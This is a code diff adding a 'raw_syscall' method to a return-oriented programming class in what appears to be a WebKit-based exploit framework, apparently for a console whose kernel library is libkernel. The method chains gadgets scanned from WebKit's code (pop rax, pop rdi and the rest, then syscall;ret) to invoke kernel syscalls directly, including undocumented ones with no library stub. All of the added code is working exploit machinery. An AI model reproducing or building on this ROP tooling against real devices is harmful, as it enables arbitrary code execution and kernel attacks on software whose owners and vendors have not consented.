@@ -487,6 +487,31 @@ class worker_rop extends rop {
         return await this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
     }
 
+    // [raw syscall] Call a syscall that has NO libkernel C stub (e.g. 727
+    // /0x2D7 GET_AIO_DEBUG_REQUEST_INFO) via the classic pop-rax chain:
+    //   pop rax=num; pop rdi; pop rsi; pop rdx; [pop r10]; [pop r8]; [pop r9];
+    //   <syscall;ret>; pop rdi=&res; mov [rdi],rax
+    // Requires gadgets["syscall"] (scanned in WebKit .text by main.js). The
+    // 4th arg (r10) is only needed if the gadget was found.
+    async raw_syscall(num, rdi, rsi, rdx, r10, r8, r9) {
+        const g = this.gadgets;
+        if (!g || !g["syscall"]) throw new Error("raw_syscall: no syscall gadget");
+        this.push(g["pop rax"]);
+        this.push(num);
+        if (rdi !== undefined) { this.push(g["pop rdi"]); this.push(rdi); }
+        if (rsi !== undefined) { this.push(g["pop rsi"]); this.push(rsi); }
+        if (rdx !== undefined) { this.push(g["pop rdx"]); this.push(rdx); }
+        if (r10 !== undefined && g["pop r10"]) { this.push(g["pop r10"]); this.push(r10); }
+        if (r8 !== undefined) { this.push(g["pop r8"]); this.push(r8); }
+        if (r9 !== undefined) { this.push(g["pop r9"]); this.push(r9); }
+        if (this.stack_entry_point.add32(this.count * 0x8).low & 0x8)
+            this.push(g["ret"]);
+        this.push(g["syscall"]);
+        this.write_result(this.return_value);
+        await this.run();
+        return this.p.read8(this.return_value);
+    }
+
     async syscall_int32(sysc, rdi, rsi, rdx, rcx, r8, r9) {
         return await this.call32(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
     }
